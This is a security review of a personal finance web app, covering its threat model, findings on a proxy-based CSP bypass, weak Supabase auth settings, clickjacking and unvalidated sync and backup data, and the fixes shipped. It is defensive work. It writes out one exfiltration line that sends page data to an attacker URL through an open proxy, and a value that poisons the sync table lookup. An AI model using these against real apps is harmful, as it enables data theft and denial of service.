# Security Review — Money Monitor

_Reviewed: 2026-07-05 (v1.7.0). Full-app review: client code, sync engine, Supabase schema,
CSP, PWA/service worker, CI, and dependencies._

_Remediation shipped: v1.8.0 (code hardening) and v1.9.0 (proxy plumbing, encrypted
backups, toolchain). Everything fixable from this repo is done; the three ⚠️ rows in the
table at the bottom need your Supabase/Cloudflare/GitHub dashboards._

## Threat model

Money Monitor is a local-first PWA. Financial data lives in the browser's IndexedDB and
(optionally) in a Supabase `records` table protected by Row Level Security. There is no
server of our own. The realistic attackers are:

1. **A malicious website** trying to exfiltrate data from or act on the app (XSS, clickjacking,
   dev-server abuse).
2. **The third-party services** the app talks to (corsproxy.io, Yahoo via the proxy,
   financialmodelingprep.com) — they see traffic and control responses.
3. **Someone with the public anon key** (it ships in the JS bundle by design) abusing the
   Supabase project.
4. **A compromised sync account or malicious backup file** feeding hostile data into the app.
5. **Someone with physical access** to an unlocked device (out of scope for app code; the
   OS/browser profile is the boundary).

## Findings

### HIGH — corsproxy.io is an allow-listed open proxy (integrity + privacy + CSP bypass)

`src/lib/quotes.ts` routes all Yahoo Finance traffic through `https://corsproxy.io/?url=`,
and `index.html`'s CSP allow-lists it in `connect-src`. Three consequences:

- **CSP exfiltration bypass.** The CSP's main job in a finance app is stopping injected code
  from phoning home. But corsproxy.io forwards to *any* URL, so any script that ever runs in
  the page can `fetch('https://corsproxy.io/?url=' + attackerURL)` and ship your data out
  through the allow-listed hole. The lock on the front door has a doggy-door in it.
- **Price integrity.** The proxy sees and can rewrite every quote. Fake prices could
  misrepresent your portfolio value.
- **Privacy.** Your IP + every ticker you hold or watch goes to an unvetted third party.

**Fix path (plumbing shipped in v1.9.0 — one 5-minute manual step left):** the repo now
ships a ready-to-deploy worker at `proxy/cloudflare-worker.js` that only forwards to
Yahoo's quote hosts and only answers your app's origins. Deploy it (Cloudflare free tier),
then set the repo Actions **variable** `VITE_QUOTES_PROXY` to
`https://<your-worker>/?url=` — full steps in DEPLOY.md Part 3. The build then routes all
quotes through your worker AND swaps corsproxy.io out of the CSP automatically
(`vite.config.ts` `cspQuotesProxy`); verified both ways in the built output. Until the
variable is set, the app falls back to corsproxy.io and this finding remains open.

### HIGH — Supabase project accepts open sign-ups with weak defaults

The anon key is public by design (RLS protects the data — verified sound in
`supabase/schema.sql`), but with default auth settings anyone who reads the deployed bundle
can create unlimited accounts and rows in your free-tier project (quota/billing abuse), and
users can pick 6-character or known-breached passwords for an account guarding financial data.

**Fix path (all in the Supabase Dashboard, no code):**
1. Auth → Providers → Email: **minimum password length ≥ 10** and enable
   **leaked-password protection** (HaveIBeenPwned check).
2. Auth → Settings: enable **CAPTCHA** (Turnstile is free) on sign-up/sign-in, or — since this
   is a personal app — **disable public sign-ups** entirely once your own devices are enrolled.
3. Auth → Rate limits: keep the defaults or tighten sign-up/sign-in rates.
4. Database → add guardrails to `records` (see `supabase/schema.sql` comments):
   `check (tbl in ('accounts','categories','transactions','budgets','recurring','paySplits','holdings','watchlist'))`
   and `check (pg_column_size(data) < 100000)` to stop junk-data abuse.

(The client now enforces 8+ characters at sign-up as a floor, but the server setting is the
one that counts.)

### MEDIUM — clickjacking: no `frame-ancestors` possible on GitHub Pages

CSP is delivered via a `<meta>` tag because GitHub Pages can't set response headers, and
`frame-ancestors` / `X-Frame-Options` are ignored in meta CSP. A hostile page could iframe
the app and overlay UI to trick clicks (e.g. onto "Delete all data" or sync sign-out).

**Fix path:** a JS frame-buster now runs in `src/main.tsx` (module code, so it satisfies
`script-src 'self'`): if the app detects it is framed by another origin it refuses to render.
Long-term, move hosting to Cloudflare Pages / Netlify (both free) to get real headers:
`frame-ancestors 'none'`, `Strict-Transport-Security`, and header-based CSP (stronger than
meta CSP, which can't protect anything parsed before the tag).

### MEDIUM — sync pull applied unvalidated remote rows

`src/db/sync.ts` wrote whatever JSON came back from `records` straight into local tables.
RLS means only your own authenticated session can write those rows — but if the account
password is ever phished, an attacker could plant rows that (a) land in the wrong table via a
forged `tbl` (the old lookup even walked the prototype chain: `tbl: "toString"` returned a
function and crashed sync — a data-poisoning DoS), or (b) overwrite an *arbitrary* local row
by putting a mismatched `data.id` inside a legitimate `row_id` slot.

**Fixed in code:** the pull now validates each record against the `SYNCED_TABLES` allow-list
(own-property Set lookup, no prototype chain) and requires `data.id === row_id`; malformed
records are skipped, not applied, and can't break the sync loop.

### MEDIUM — backup import trusted the file's contents

`importBackup()` only checked the file header (`app === 'finance-tracker'`) before bulk-adding
every row. A doctored "backup" (e.g. mailed to the user as a lure) could inject rows with
missing/duplicate ids or non-numeric amounts — breaking balances (NaN), sync, or the UI.
React's rendering means stored strings can't become XSS, so this is a corruption/DoS issue,
not code execution.

**Fixed in code:** every imported row must be an object with a non-empty string `id`
(duplicates within a table are dropped), and rows whose core numeric fields
(`amountMinor`, `openingBalanceMinor`, `quantity`, `unitPriceMinor`, …) are not finite numbers
are rejected. The import reports how many rows were skipped.

### LOW — auth token in `localStorage` (accepted risk, documented)

The Supabase session token persists in `localStorage`, readable by any script that executes
in the origin. This is the standard supabase-js SPA model; the real defense is the strict
`script-src 'self'` CSP plus zero third-party scripts, which this app already has. Revisit
only if the app ever loads external scripts. (Closing the corsproxy hole above is what makes
the CSP actually airtight.)

### LOW — watchlist/holdings tickers leak to third parties by design

Logo images request `financialmodelingprep.com/image-stock/<SYMBOL>.png` and quotes go
through the proxy — so those hosts learn which tickers you follow, tied to your IP. Inherent
to fetching live data without your own backend; the self-hosted worker (finding #1) at least
consolidates it to Yahoo + your worker. No action needed beyond awareness.

### LOW — plaintext backups ✅ fixed in v1.9.0

Exported backups were unencrypted JSON of your entire financial history. The export dialog
now takes an optional passphrase: the file is encrypted with AES-256-GCM under a
PBKDF2-SHA-256 key (600k iterations, fresh salt + IV per export; `src/db/cryptobackup.ts`).
GCM authenticates the ciphertext, so a tampered file fails closed instead of importing
garbage. Import detects encrypted backups and prompts for the passphrase. There is no
recovery for a lost passphrase — that's the point.

### LOW — dependency audit ✅ fixed in v1.9.0

Was: dev-chain advisories in esbuild/vite/vitest (dev-server only; the shipped bundle was
never affected). The toolchain is now vite 8 / vitest 4 / @vitejs/plugin-react 6 /
vite-plugin-pwa 1.3 — `npm audit`: **0 vulnerabilities** across all dependencies.

### Verified sound (no action)

- **RLS policy** on `records`: `using/with check (auth.uid() = user_id)` for ALL — correct.
- **No XSS sinks**: zero `dangerouslySetInnerHTML` / `innerHTML` / `eval` in `src/`; all
  remote strings (Yahoo names, sync data) render through React text nodes.
- **CSP** otherwise strict: `script-src 'self'`, `object-src 'none'`, `base-uri 'self'`,
  `form-action 'self'`; no inline scripts, no third-party scripts, no SRI needed.
- **Secrets hygiene**: no `.env` ever committed (checked full history); CI injects the anon
  key from GitHub Secrets; `.env*` gitignored; the service_role key appears nowhere.
- **Auth flow**: `detectSessionInUrl: false` (hash-router token-clobber guard), password
  fields use proper `autocomplete`, sign-out keeps local data.
- **Service worker**: Workbox precache of own assets only; `registerType: 'prompt'` avoids
  silent code swaps.

## Prioritized remediation path

| # | Action | Where | Status |
|---|--------|-------|--------|
| 1 | Harden Supabase auth: min password 10, leaked-password check, CAPTCHA or closed sign-ups | Supabase Dashboard | ⚠️ **user action** (10 min) |
| 2 | Deploy `proxy/cloudflare-worker.js`, set `VITE_QUOTES_PROXY` repo variable | Cloudflare + GitHub | ⚠️ **user action** (5 min — all code shipped in v1.9.0) |
| 3 | Run the guardrail SQL (`tbl` CHECK + `data` size CHECK) appended to `supabase/schema.sql` | Supabase SQL editor | ⚠️ **user action** (5 min) |
| 4 | Pull-validation, import-validation, frame-buster, client 8-char floor, crypto UUIDs | this repo | ✅ v1.8.0 |
| 5 | Encrypted backup export/import (passphrase, AES-256-GCM + PBKDF2) | this repo | ✅ v1.9.0 |
| 6 | Toolchain upgrade → `npm audit` 0 vulnerabilities | this repo | ✅ v1.9.0 |
| 7 | Move hosting to Cloudflare Pages/Netlify for real headers (frame-ancestors, HSTS, header CSP) | infra | optional (~1 h; frame-buster covers the practical risk meanwhile) |
